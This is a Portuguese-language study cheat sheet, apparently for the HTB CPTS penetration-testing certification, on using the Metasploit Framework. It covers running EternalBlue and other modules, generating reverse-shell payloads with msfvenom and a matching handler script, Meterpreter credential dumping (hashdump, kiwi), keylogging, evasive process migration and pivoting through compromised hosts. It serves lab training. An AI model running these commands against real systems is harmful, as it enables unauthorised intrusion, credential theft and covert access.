---
tema: Metasploit Framework
tópico: msfconsole, workspaces, db_nmap, exploração, sessions, meterpreter, pivô
tags: [htb, cpts, metasploit, msfconsole, meterpreter, db_nmap, autoroute, socks, resource-script]
dificuldade: easy
---

# 🧨 CPTS 09 — Using the Metasploit Framework

> [!info] Objetivo
> Operar o Metasploit como **plataforma de pipeline**, não como uma tecla de "exploit". Workspaces separam clientes, `db_nmap` alimenta o banco, `search`/`use`/`check` escolhem o módulo, sessions/jobs controlam o acesso, e route/autoroute+socks transformam um host comprometido em ponto de pivô.

---

## 🎯 Quando usar

| Situação | Módulo/comando |
|----------|----------------|
| Mapear alvos e guardar resultado estruturado | `workspace` + `db_nmap` |
| Validar sem explorar | `check` (quando o módulo suporta) |
| Ganhar acesso por vuln conhecida | `exploit/...` + `run` |
| Subir de shell simples para meterpreter | `sessions -u <id>` |
| Pivô para rede interna | `autoroute` + `socks_proxy` |
| Reexecutar todo o setup | resource script (`.rc`) |

---

## 🚀 Subindo e base de dados

```bash
# Inicia o console sem banner
msfconsole -q

# Executa comandos direto na linha (útil em script/one-liner)
msfconsole -q -x 'db_nmap -sV <IP>; vulns; exit'
```

```bash
# PostgreSQL + MSF DB: sem isso, db_nmap/hosts/services não persistem
sudo systemctl start postgresql
sudo msfdb init          # cria e popula a base na primeira vez
msf6 > db_status         # "Connected to msf. Connection type: postgresql"
msf6 > db_rebuild_cache  # regenera o cache de busca de módulos
```

| Comando | O que faz |
|---------|-----------|
| `db_status` | Confirma conexão do banco |
| `hosts` | Hosts descobertos (com SO/notas) |
| `services` | Portas/serviços por host |
| `vulns` | Vulnerabilidades registradas |
| `creds` | Credenciais coletadas |
| `loot` | Arquivos/artefatos baixados |
| `notes` | Anotações estruturadas (ex.: flags) |

---

## 🗂️ Workspaces

```bash
# Um workspace por cliente/engajamento: evita misturar hosts e loot
msf6 > workspace -a ClienteAcme     # cria e ativa
msf6 > workspace                    # lista (o * marca o ativo)
msf6 > workspace -d teste_antigo    # apaga (e todo o conteúdo)
msf6 > workspace copy ClienteAcme escopo_blackbox
msf6 > workspace -r backup           # renomeia o ativo
```

---

## 🗺️ db_nmap e busca de módulos

```bash
# Roda o nmap e grava tudo no banco automaticamente
msf6 > db_nmap -sV -sC -p- <IP>
msf6 > services -p 445 -R      # -R = preenche RHOSTS com esses hosts
msf6 > hosts -R
```

```bash
# Busca com filtros (muito melhor que grep)
search type:exploit platform:windows smb
search cve:2021-44228
search name:eternalblue
search port:445 rank:excellent
search type:auxiliary name:scanner smb
```

| Ranking | Significado |
|---------|-------------|
| Excellent | Nunca falha/crasha; alvo confiável |
| Great | Muito confiável |
| Good | Confiável em cenários comuns |
| Normal | Padrão para o tipo |
| Average | Confiabilidade razoável, pode falhar |
| Low | Raramente funciona / quase sempre crasha |
| Manual | Sem exploit automático: exige trabalho |

```bash
use exploit/windows/smb/ms17_010_eternalblue
info                      # descrição, refs, alvos, ranking
show options              # parâmetros obrigatórios (Required = yes)
show payloads             # payloads compatíveis
show targets              # SO/arquitetura-alvo
check                     # verificação não destrutiva, se suportada
```

---

## ⚙️ Configuração e execução

```bash
msf6 > set RHOSTS <IP>
msf6 > set LHOST tun0            # interface correta é o erro nº 1
msf6 > set LPORT 443
msf6 > setg LHOST tun0           # global: vale para todos os módulos
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set rhosts file:/tmp/hosts.txt   # lista de alvos de um arquivo
msf6 > unset LPORT
msf6 > show missing              # mostra o que ainda falta configurar
```

| Execução | Comportamento |
|----------|---------------|
| `run` / `exploit` | Dispara em foreground |
| `exploit -j` | Job em background (sessão remota não morre ao sair do console) |
| `exploit -z` | Não interage com a sessão ao abrir |
| `exploit -j -z` | Combinação para múltiplos alvos |
| `run -e` | Abandona sessões de sucesso? (varia por módulo) |

---

## 🖥️ Sessions e jobs

```bash
msf6 > sessions -l                 # lista sessões
msf6 > sessions -i 1               # interage
msf6 > background                  # (Ctrl+Z) volta para o console
msf6 > sessions -k 1               # mata sessão
msf6 > sessions -u 2               # upgrade de shell simples -> meterpreter
msf6 > sessions -c 'whoami' -i 1   # roda comando em sessão sem entrar nela
msf6 > sessions -C 'ls -la' -i 1   # como acima (variante por sessão)
msf6 > jobs -l                     # lista jobs
msf6 > jobs -k 0                   # mata job
```

---

## 🔧 Meterpreter

| Comando | O que faz |
|---------|-----------|
| `sysinfo` / `getuid` | Info do host / usuário atual |
| `ps` / `migrate <pid>` | Processos / migrar para um mais estável e menos observado |
| `getsystem` | Tenta escalar para SYSTEM |
| `hashdump` | Dump de hashes SAM (precisa de SYSTEM) |
| `ls` / `cd` / `download` / `upload` | Navegação e transferência |
| `search -f segredo.txt` | Busca de arquivo recursiva no alvo |
| `shell` | Abre cmd/bash dentro da sessão |
| `load kiwi` → `creds_all` | Kiwi (mimikatz) para credenciais em memória |
| `getprivs` / `getenv` | Privilégios / variáveis de ambiente |
| `screenshot` / `keyscan_start` | Captura de tela / keylogger |
| `portfwd add -l 8080 -p 80 -r <IP_INTERNO>` | Redireciona porta local para dentro |

> [!tip] Prefixe com `run` para chamar módulos post a partir da sessão:
> `run post/multi/recon/local_exploit_suggester`

---

## 🧩 Módulos post

```bash
# Rodam DEPOIS do acesso: coletam, escalam, movem
run post/multi/manage/shell_to_meterpreter    # upgrade confiável
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/credential_collector
run post/multi/gather/ssh_creds
run post/linux/gather/enum_configs
run post/multi/recon/local_exploit_suggester  # sugere privesc pelo patch level
```

```bash
# Direto no console (sem sessão interativa)
msf6 > use post/windows/gather/enum_domain
msf6 > set SESSION 1
msf6 > exploit
```

---

## 🌐 Pivoting: route, autoroute e SOCKS

```bash
# 1) Adiciona rota no MSF através da sessão comprometida
msf6 > route add 172.16.5.0/24 1        # <subnet> <session_id>
msf6 > route print

# 2) Ou com o post module (descobre e adiciona sozinho)
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > run
```

```bash
# 3) Proxy SOCKS na porta 1080 com saída pela rede interna
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVHOST 127.0.0.1
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run -j
# Cliente: proxychains4 com "socks5 127.0.0.1 1080"
# proxychains -q nmap -sT -Pn <IP_INTERNO>
```

> [!warning] Scan via proxychains **exige** TCP connect (`-sT`) — SYN scan não atravessa SOCKS.

---

## 📜 Resource scripts e msfvenom

```bash
# Grava tudo que você digitou na sessão em um .rc
msf6 > makerc /tmp/setup.rc

# Cria um .rc manual para reprodutibilidade
cat > handler.rc <<'EOF'
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST tun0
set LPORT 443
set ExitOnSession false
exploit -j -z
EOF
msf6 > resource /tmp/handler.rc
```

```bash
# msfvenom alimenta o multi/handler (detalhes em CPTS 08)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe
```

```bash
# Modo burro mas útil: ler resultados no console
msf6 > spool /tmp/sessao.log     # grava a saída do console em arquivo
msf6 > grep -h "445" services
```

---

## ⚠️ Pegadinhas

- `LHOST` errado (IP do `eth0` em vez do `tun0` do HTB) = payload que nunca chama de volta.
- `exploit` sem `-j` mata a sessão ao sair; use `-j -z` para caçar vários alvos.
- `db_status` desconectado faz `db_nmap`/`hosts` parecerem vazios — não é bug, é banco.
- `check` não existe em todo módulo; quando existe é **não destrutivo por contrato**, mas leia `info`.
- MSF **copia** o payload para o alvo; em alvo hardened o módulo morre na entrega — combine com transferência manual.
- Na dúvida, prefira payload **stageless**; staged pode morrer se a 2ª conexão falhar.
- `meterpreter` em sessão de privesc: `getsystem` pode falhar; use `local_exploit_suggester`.
- Sessões **não** sobrevivem a reboot do MSF: `sessions -l` vazio não é "perdeu o alvo", é job perdido.

## ✅ Checklist rápido

- [ ] `db_status` conectado e workspace correto
- [ ] `db_nmap` rodado e `services` populado
- [ ] Módulo escolhido por ranking + `info` lido
- [ ] `check` quando disponível
- [ ] `LHOST` na interface de alcance do alvo
- [ ] `exploit -j -z` para múltiplos alvos
- [ ] `sessions -u` para upgrade e `background` para navegar
- [ ] Rotas/SOCKS limpos ao terminar (`route print`, `jobs -k`)

## 🔗 Relacionado

- [[CPTS 06 - Vulnerability Assessment]]
- [[CPTS 08 - Shells and Payloads]]
- [[CPTS 12 - Pivoting, Tunneling, and Port Forwarding]]
- [[CPTS 13 - Active Directory Enumeration and Attacks]]
- [[Fase 06 - Vulnerabilidade e Exploração]]
